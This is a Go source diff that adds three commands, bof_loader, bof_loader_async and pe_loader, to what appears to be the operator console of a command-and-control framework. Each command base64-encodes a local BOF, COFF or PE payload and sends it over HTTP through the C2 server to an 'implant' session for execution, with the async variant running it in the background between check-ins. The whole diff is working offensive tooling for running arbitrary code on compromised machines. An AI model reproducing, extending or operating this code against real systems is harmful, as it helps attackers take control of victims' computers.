@@ -530,4 +530,136 @@ func InitializeSessionCLI(sessionApp *grumble.App, activeSession int) {
 
 	sessionApp.AddCommand(sessionPidInject)
 
+	sessionBOFLoader := &grumble.Command{
+		Name:     "bof_loader",
+		Help:     "delivers a BOF/COFF/PE payload to be executed by the implant",
+		LongHelp: "delivers a BOF/COFF/PE payload to be executed by the implant (pass arguments with -a)",
+		Args: func(a *grumble.Args) {
+			a.String("payload", "path to the file containing the BOF/COFF/PE payload")
+		},
+		Flags: func(f *grumble.Flags) {
+			f.String("a", "arguments", "", "arguments to be passed to the BOF/COFF/PE payload, if any (empty by default)")
+		},
+		Run: func(c *grumble.Context) error {
+
+			uploadFile := c.Args.String("payload")
+			arguments := c.Flags.String("arguments")
+			fileName := uploadFile
+
+			fileb64 := core.UploadFile(uploadFile)
+
+			if fileb64 != "" {
+
+				reqString := "&isSessionShell=true&activeSession=" + strconv.Itoa(ActiveSession) + "&command=bof_loader"
+				commandString := "&filename=" + url.QueryEscape(arguments) + "&file=" + url.QueryEscape(fileb64)
+
+				reqString = core.AuthURL + reqString + commandString
+
+				resp, err := core.WolfPackHTTP.Get(reqString)
+
+				if err != nil {
+					fmt.Println(err)
+					return nil
+				}
+
+				defer resp.Body.Close()
+
+				core.SuccessColorBold.Println("BOF: " + fileName + " should now be loaded!")
+
+			}
+
+			return nil
+		},
+	}
+
+	sessionApp.AddCommand(sessionBOFLoader)
+
+	sessionBOFLoaderAsync := &grumble.Command{
+		Name:     "bof_loader_async",
+		Help:     "delivers a BOF/COFF payload to be executed asynchronously (non-blocking)",
+		LongHelp: "delivers a BOF/COFF payload to be executed in a background goroutine while the implant continues checking in (pass arguments with -a). Results are returned on the next check-in after completion.",
+		Args: func(a *grumble.Args) {
+			a.String("payload", "path to the file containing the BOF/COFF payload")
+		},
+		Flags: func(f *grumble.Flags) {
+			f.String("a", "arguments", "", "arguments to be passed to the BOF/COFF payload, if any (empty by default)")
+		},
+		Run: func(c *grumble.Context) error {
+
+			uploadFile := c.Args.String("payload")
+			arguments := c.Flags.String("arguments")
+			fileName := uploadFile
+
+			fileb64 := core.UploadFile(uploadFile)
+
+			if fileb64 != "" {
+
+				reqString := "&isSessionShell=true&activeSession=" + strconv.Itoa(ActiveSession) + "&command=bof_loader_async"
+				commandString := "&filename=" + url.QueryEscape(arguments) + "&file=" + url.QueryEscape(fileb64)
+
+				reqString = core.AuthURL + reqString + commandString
+
+				resp, err := core.WolfPackHTTP.Get(reqString)
+
+				if err != nil {
+					fmt.Println(err)
+					return nil
+				}
+
+				defer resp.Body.Close()
+
+				core.SuccessColorBold.Println("BOF (async): " + fileName + " should now be queued!")
+
+			}
+
+			return nil
+		},
+	}
+
+	sessionApp.AddCommand(sessionBOFLoaderAsync)
+
+	sessionPELoader := &grumble.Command{
+		Name:     "pe_loader",
+		Help:     "delivers a PE payload to be executed by the implant",
+		LongHelp: "delivers a PE payload to be executed by the implant (pass arguments with -a)",
+		Args: func(a *grumble.Args) {
+			a.String("payload", "path to the file containing the PE payload")
+		},
+		Flags: func(f *grumble.Flags) {
+			f.String("a", "arguments", "", "arguments to be passed to the PE payload, if any (empty by default)")
+		},
+		Run: func(c *grumble.Context) error {
+
+			uploadFile := c.Args.String("payload")
+			arguments := c.Flags.String("arguments")
+			fileName := uploadFile
+
+			fileb64 := core.UploadFile(uploadFile)
+
+			if fileb64 != "" {
+
+				reqString := "&isSessionShell=true&activeSession=" + strconv.Itoa(ActiveSession) + "&command=pe_loader"
+				commandString := "&filename=" + url.QueryEscape(arguments) + "&file=" + url.QueryEscape(fileb64)
+
+				reqString = core.AuthURL + reqString + commandString
+
+				resp, err := core.WolfPackHTTP.Get(reqString)
+
+				if err != nil {
+					fmt.Println(err)
+					return nil
+				}
+
+				defer resp.Body.Close()
+
+				core.SuccessColorBold.Println("PE: " + fileName + " should now be loaded!")
+
+			}
+
+			return nil
+		},
+	}
+
+	sessionApp.AddCommand(sessionPELoader)
+
 }
